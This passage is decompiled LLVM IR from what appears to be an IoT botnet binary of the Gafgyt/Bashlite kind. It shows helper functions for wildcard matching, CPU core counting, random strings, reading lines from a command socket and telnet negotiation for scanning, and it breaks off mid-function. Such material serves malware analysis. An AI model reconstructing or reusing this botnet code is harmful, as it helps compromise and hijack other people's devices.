  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp9, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge4 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp9, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp9, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.8 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.8, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_9438 ], [ %storemerge3, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95cc3 = load i8, i8* %storemerge2, align 1
  %v2_95d05 = icmp eq i8 %v2_95cc3, 0
  br i1 %v2_95d05, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d88 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge2, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d88, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @fp, align 4
  store i32 %v3_95e0, i32* %stack_var_-16, align 4
  %v13_95e0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v13_95e0, i32* @r2, align 4
  %v4_9608 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1b320.49, i32 0, i32 0), i32 0)
  %v2_97cc = ptrtoint i32* %stack_var_-4120 to i32
  %v1_9628 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_97c4

dec_label_pc_9618:                                ; preds = %dec_label_pc_97c4
  %v2_9628 = call i32 @uppercase(i8* %v1_9628)
  %v4_9640 = call i32 @strstr(i32 %v2_97cc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b330.51, i32 0, i32 0))
  %v9_9658 = icmp eq i32 %v4_9640, %v2_97cc
  br i1 %v9_9658, label %dec_label_pc_9660, label %dec_label_pc_97a8

dec_label_pc_9660:                                ; preds = %dec_label_pc_9618
  %tmp18 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_9684

dec_label_pc_9678:                                ; preds = %dec_label_pc_96a4, %dec_label_pc_9694, %dec_label_pc_9684
  %v1_967c = add i32 %v4_9684, 1
  %v5_9680 = inttoptr i32 %v1_967c to i8*
  br label %dec_label_pc_9684

dec_label_pc_9684:                                ; preds = %dec_label_pc_9660, %dec_label_pc_9678
  %storemerge2 = phi i8* [ %v5_9680, %dec_label_pc_9678 ], [ %tmp18, %dec_label_pc_9660 ]
  %v4_9684 = ptrtoint i8* %storemerge2 to i32
  %v2_9688 = load i8, i8* %storemerge2, align 1
  %v7_968c = icmp eq i8 %v2_9688, 32
  br i1 %v7_968c, label %dec_label_pc_9678, label %dec_label_pc_9694

dec_label_pc_9694:                                ; preds = %dec_label_pc_9684
  %v2_9698 = load i8, i8* %storemerge2, align 1
  %v7_969c = icmp eq i8 %v2_9698, 9
  br i1 %v7_969c, label %dec_label_pc_9678, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9694
  %v2_96a8 = load i8, i8* %storemerge2, align 1
  %v7_96ac = icmp eq i8 %v2_96a8, 58
  br i1 %v7_96ac, label %dec_label_pc_9678, label %dec_label_pc_96e0.preheader

dec_label_pc_96e0.preheader:                      ; preds = %dec_label_pc_96a4
  %v2_96f8 = add i32 %v4_9684, -1
  br label %dec_label_pc_96e0

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96e0, %dec_label_pc_970c
  %v3_96c0 = call i32 @strlen(i8* %storemerge2)
  %v1_96d4 = add i32 %v2_96f8, %v3_96c0
  %v3_96dc = inttoptr i32 %v1_96d4 to i8*
  store i8 0, i8* %v3_96dc, align 1
  br label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96e0.preheader, %dec_label_pc_96b8
  %v3_96e8 = call i32 @strlen(i8* %storemerge2)
  %v1_96fc = add i32 %v3_96e8, %v2_96f8
  %v1_9700 = inttoptr i32 %v1_96fc to i8*
  %v2_9700 = load i8, i8* %v1_9700, align 1
  %v7_9704 = icmp eq i8 %v2_9700, 13
  br i1 %v7_9704, label %dec_label_pc_96b8, label %dec_label_pc_970c

dec_label_pc_970c:                                ; preds = %dec_label_pc_96e0
  %v3_9714 = call i32 @strlen(i8* %storemerge2)
  %v1_9728 = add i32 %v3_9714, %v2_96f8
  %v1_972c = inttoptr i32 %v1_9728 to i8*
  %v2_972c = load i8, i8* %v1_972c, align 1
  %v7_9730 = icmp eq i8 %v2_972c, 10
  br i1 %v7_9730, label %dec_label_pc_96b8, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  %v2_9744 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v2_974c = icmp eq i32 %v2_9744, 0
  br i1 %v2_974c, label %dec_label_pc_9770, label %dec_label_pc_9754

dec_label_pc_9754:                                ; preds = %dec_label_pc_9738
  %v2_9760 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v3_976c = inttoptr i32 %v2_9760 to i8*
  store i8 0, i8* %v3_976c, align 1
  br label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9738, %dec_label_pc_9754
  %v3_978c = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  %v1_9794 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_97a8:                                ; preds = %dec_label_pc_9618
  store i32 4096, i32* @r2, align 4
  %v3_97c0 = call i32 @__GI_memset(i8* %v1_9628, i32 0)
  br label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %entry, %dec_label_pc_97a8
  %v4_97dc = call i32 @fdgets(i32 %v2_97cc, i32 4096, i32 %v4_9608, i32 %v2_97cc)
  %v2_97e4 = icmp eq i32 %v4_97dc, 0
  br i1 %v2_97e4, label %dec_label_pc_97ec, label %dec_label_pc_9618

dec_label_pc_97ec:                                ; preds = %dec_label_pc_97c4
  %v1_97f0 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_9770, %dec_label_pc_97ec
  %storemerge4 = phi i32 [ 1, %dec_label_pc_97ec ], [ 0, %dec_label_pc_9770 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_96f8, { 1, 2, 0 }
  uselistorder i8* %storemerge2, { 0, 1, 3, 2, 4, 5, 7, 6 }
  uselistorder i32 %v2_97cc, { 0, 3, 1, 2 }
  uselistorder i32 %v4_9608, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_9800, { 1, 0 }
  uselistorder label %dec_label_pc_97c4, { 1, 0 }
  uselistorder label %dec_label_pc_9770, { 1, 0 }
  uselistorder label %dec_label_pc_96e0, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
  uselistorder label %dec_label_pc_9684, { 1, 0 }
}

define i32 @getCores(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_982c = ptrtoint i32* %stack_var_-4120 to i32
  %v4_9840 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1b320.49, i32 0, i32 0), i32 0)
  %v1_9860 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_98bc

dec_label_pc_9850:                                ; preds = %dec_label_pc_98bc
  %v2_9860 = call i32 @uppercase(i8* %v1_9860)
  %v4_9878 = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b330.51, i32 0, i32 0))
  %v9_988c = icmp eq i32 %v4_9878, %v2_982c
  br i1 %v9_988c, label %dec_label_pc_9894, label %dec_label_pc_98a0

dec_label_pc_9894:                                ; preds = %dec_label_pc_9850
  %v1_9898 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9850, %dec_label_pc_9894
  %stack_var_-24.0 = phi i32 [ %v1_9898, %dec_label_pc_9894 ], [ %stack_var_-24.1, %dec_label_pc_9850 ]
  store i32 4096, i32* @r2, align 4
  %v3_98b8 = call i32 @__GI_memset(i8* %v1_9860, i32 0)
  br label %dec_label_pc_98bc

dec_label_pc_98bc:                                ; preds = %entry, %dec_label_pc_98a0
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_98a0 ]
  %v4_98d4 = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v4_9840, i32 %v2_982c)
  %v2_98dc = icmp eq i32 %v4_98d4, 0
  br i1 %v2_98dc, label %dec_label_pc_98e4, label %dec_label_pc_9850

dec_label_pc_98e4:                                ; preds = %dec_label_pc_98bc
  %v1_98e8 = call i32 @__libc_close(i32 %v4_9840)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_98bc, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_9908 = load i32, i32* @r4, align 4
  %v6_9908 = load i32, i32* @fp, align 4
  %v0_9914 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_998017 = icmp sgt i32 %arg2, 0
  br i1 %v5_998017, label %dec_label_pc_9930, label %dec_label_pc_9984

dec_label_pc_9930:                                ; preds = %entry, %dec_label_pc_9930
  %storemerge118 = phi i32 [ %v1_996c, %dec_label_pc_9930 ], [ 0, %entry ]
  %v2_993c = add i32 %storemerge118, %v0_9914
  store i32 %v2_993c, i32* @r4, align 4
  %v0_9940 = call i32 @rand_cmwc()
  %v2_9950 = urem i32 %v0_9940, 26
  store i32 %v2_9950, i32* %r0.global-to-local, align 4
  %v1_995c = add nuw nsw i32 %v2_9950, 65
  %v1_9964 = trunc i32 %v1_995c to i8
  %v2_9964 = load i32, i32* @r4, align 4
  %v3_9964 = inttoptr i32 %v2_9964 to i8*
  store i8 %v1_9964, i8* %v3_9964, align 1
  %v1_996c = add i32 %storemerge118, 1
  %v3_9978.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9980 = icmp slt i32 %v1_996c, %v3_9978.pre
  br i1 %v5_9980, label %dec_label_pc_9930, label %dec_label_pc_9974.dec_label_pc_9984_crit_edge

dec_label_pc_9974.dec_label_pc_9984_crit_edge:    ; preds = %dec_label_pc_9930
  %v12_9988.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9984

dec_label_pc_9984:                                ; preds = %dec_label_pc_9974.dec_label_pc_9984_crit_edge, %entry
  %v12_9988 = phi i32 [ %v12_9988.pre, %dec_label_pc_9974.dec_label_pc_9984_crit_edge ], [ %v0_9914, %entry ]
  store i32 %v3_9908, i32* @r4, align 4
  store i32 %v6_9908, i32* @fp, align 4
  ret i32 %v12_9988

; uselistorder directives
  uselistorder i32 %v1_996c, { 1, 0 }
  uselistorder label %dec_label_pc_9930, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_99e0.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9990 = load i32, i32* @fp, align 4
  store i32 %v3_9990, i32* %stack_var_-16, align 4
  store i32 39320, i32* %stack_var_-4, align 4
  %v2_9994 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9994, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_99b8 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_99cc = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99e0.lr.ph, %dec_label_pc_99e0
  %storemerge527 = phi i32 [ 0, %dec_label_pc_99e0.lr.ph ], [ %v1_99f4, %dec_label_pc_99e0 ]
  %v5_99ec = mul nuw nsw i32 %storemerge527, 4
  %v6_99ec = add i32 %v5_99ec, %v2_99cc
  %v7_99ec = inttoptr i32 %v6_99ec to i32*
  store i32 0, i32* %v7_99ec, align 4
  %v1_99f4 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_99f4, 32
  br i1 %tmp52, label %dec_label_pc_99e0, label %dec_label_pc_9a08

dec_label_pc_9a08:                                ; preds = %dec_label_pc_99e0
  %v13_9990 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9a0c = udiv i32 %arg1, 32
  %v3_9a18 = mul nuw nsw i32 %v3_9a0c, 4
  %v2_9a20 = add nsw i32 %v3_9a18, -160
  %v2_9a24 = add i32 %v2_9a20, %v13_9990
  %v1_9a28 = inttoptr i32 %v2_9a24 to i32*
  %v2_9a28 = load i32, i32* %v1_9a28, align 4
  %v1_9a30 = urem i32 %arg1, 32
  %v6_9a38 = shl i32 1, %v1_9a30
  %v2_9a3c = or i32 %v2_9a28, %v6_9a38
  store i32 %v2_9a3c, i32* %v1_9a28, align 4
  %v1_9a5c = add i32 %arg1, 1
  %v2_9a68 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9a7c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9a90 = icmp sgt i32 %v5_9a7c, 0
  br i1 %v5_9a90, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b90.preheader

dec_label_pc_9b90.preheader:                      ; preds = %dec_label_pc_9a08
  %v7_9b9823 = icmp slt i32 %tmp33, 10
  br i1 %v7_9b9823, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9ad0.lr.ph:                          ; preds = %dec_label_pc_9b90.preheader, %dec_label_pc_9b84
  %stack_var_-44.024 = phi i32 [ %v1_9b88, %dec_label_pc_9b84 ], [ %tmp33, %dec_label_pc_9b90.preheader ]
  %v2_9a9c = load i32, i32* @global_var_2d604.55, align 4
  %v3_9aa8 = call i32 @sockprintf(i32 %v2_9a9c, i32 ptrtoint ([5 x i8]* @global_var_1b33c.57 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ad0.lr.ph, %dec_label_pc_9ad0
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9ad0.lr.ph ], [ %v1_9ae4, %dec_label_pc_9ad0 ]
  %v5_9adc = mul nuw nsw i32 %storemerge615, 4
  %v6_9adc = add i32 %v5_9adc, %v2_99cc
  %v7_9adc = inttoptr i32 %v6_9adc to i32*
  store i32 0, i32* %v7_9adc, align 4
  %v1_9ae4 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9ae4, 32
  br i1 %tmp53, label %dec_label_pc_9ad0, label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9ad0
  %v2_9b18 = load i32, i32* %v1_9a28, align 4
  %v2_9b2c = or i32 %v2_9b18, %v6_9a38
  store i32 %v2_9b2c, i32* %v1_9a28, align 4
  store i32 0, i32* @r2, align 4
  %v5_9b6c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9b80 = icmp sgt i32 %v5_9b6c, 0
  br i1 %v5_9b80, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9af8
  %v1_9b88 = add nsw i32 %stack_var_-44.024, 1
  %v7_9b98 = icmp slt i32 %v1_9b88, 10
  br i1 %v7_9b98, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9c24.preheader:                      ; preds = %dec_label_pc_9b84, %dec_label_pc_9af8, %dec_label_pc_9b90.preheader, %dec_label_pc_9a08
  %v5_9bcc = bitcast i8* %stack_var_-185 to i32*
  %not.v7_9c2c57 = icmp sgt i32 %arg3, 1
  %v2_9c4459 = icmp eq i1 %not.v7_9c2c57, false
  br i1 %v2_9c4459, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %dec_label_pc_9c24.preheader, %dec_label_pc_9c18
  %v1_9c2862.in = phi i32 [ %v1_9c2862, %dec_label_pc_9c18 ], [ %arg3, %dec_label_pc_9c24.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9c08, %dec_label_pc_9c18 ], [ %arg2, %dec_label_pc_9c24.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9c1c, %dec_label_pc_9c18 ], [ 0, %dec_label_pc_9c24.preheader ]
  %v1_9c2862 = add i32 %v1_9c2862.in, -1
  %v2_9bb4 = load i32, i32* @global_var_2d604.55, align 4
  %v6_9bcc = call i32 @__libc_recv(i32 %v2_9bb4, i32* %v5_9bcc, i32 1, i32 0, i32 %v1_9c2862)
  %v7_9bd4 = icmp eq i32 %v6_9bcc, 1
  br i1 %v7_9bd4, label %dec_label_pc_9bf4, label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9bb0
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bb0
  %v3_9bf4 = load i8, i8* %stack_var_-185, align 1
  %v4_9bf8 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9bf4, i8* %stack_var_-40.061, align 1
  %v1_9c04 = add i32 %v4_9bf8, 1
  %v5_9c08 = inttoptr i32 %v1_9c04 to i8*
  %v3_9c0c = load i8, i8* %stack_var_-185, align 1
  %v7_9c10 = icmp eq i8 %v3_9c0c, 10
  br i1 %v7_9c10, label %dec_label_pc_9c4c, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9bf4
  %v1_9c1c = add i32 %stack_var_-36.060, 1
  %not.v7_9c2c = icmp sgt i32 %v1_9c2862, 1
  %v2_9c44 = icmp eq i1 %not.v7_9c2c, false
  br i1 %v2_9c44, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9c4c:                                ; preds = %dec_label_pc_9bf4, %dec_label_pc_9c18, %dec_label_pc_9c24.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9c24.preheader ], [ %v1_9c1c, %dec_label_pc_9c18 ], [ %stack_var_-36.060, %dec_label_pc_9bf4 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9c24.preheader ], [ %v5_9c08, %dec_label_pc_9c18 ], [ %v5_9c08, %dec_label_pc_9bf4 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9c60:                                ; preds = %dec_label_pc_9bdc, %dec_label_pc_9c4c
  %storemerge = phi i32 [ -1, %dec_label_pc_9bdc ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9c4c ]
  %v2_9c6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9c6c, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9c2862, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9b88, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_99cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9c60, { 1, 0 }
  uselistorder label %dec_label_pc_9c4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_99e0, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9c7c = load i32, i32* @fp, align 4
  %v1_9c90 = add i32 %arg1, 4
  %v2_9c90 = inttoptr i32 %v1_9c90 to i32*
  %v3_9c90 = load i32, i32* %v2_9c90, align 4
  store i32 %v3_9c90, i32* @r0, align 4
  %v1_9c9c = call i32 @__GI_inet_ntoa(i32 %v3_9c90)
  store i32 %v3_9c7c, i32* @fp, align 4
  ret i32 %v1_9c9c
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9cb4 = load i32, i32* @fp, align 4
  store i32 40124, i32* %stack_var_-4, align 4
  %v2_9cb8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9cb8, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9ce0 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9cf4 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9d04 = load i8, i8* %arg3, align 1
  %v2_9d08 = icmp eq i8 %v2_9d04, -1
  br i1 %v2_9d08, label %dec_label_pc_9d10, label %dec_label_pc_9d20

dec_label_pc_9d10:                                ; preds = %entry
  %v3_9d04 = zext i8 %v2_9d04 to i32
  %v6_9d1c = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9d04, i32 %v5_9cf4)
  br label %dec_label_pc_9d20

dec_label_pc_9d20:                                ; preds = %entry, %dec_label_pc_9d10
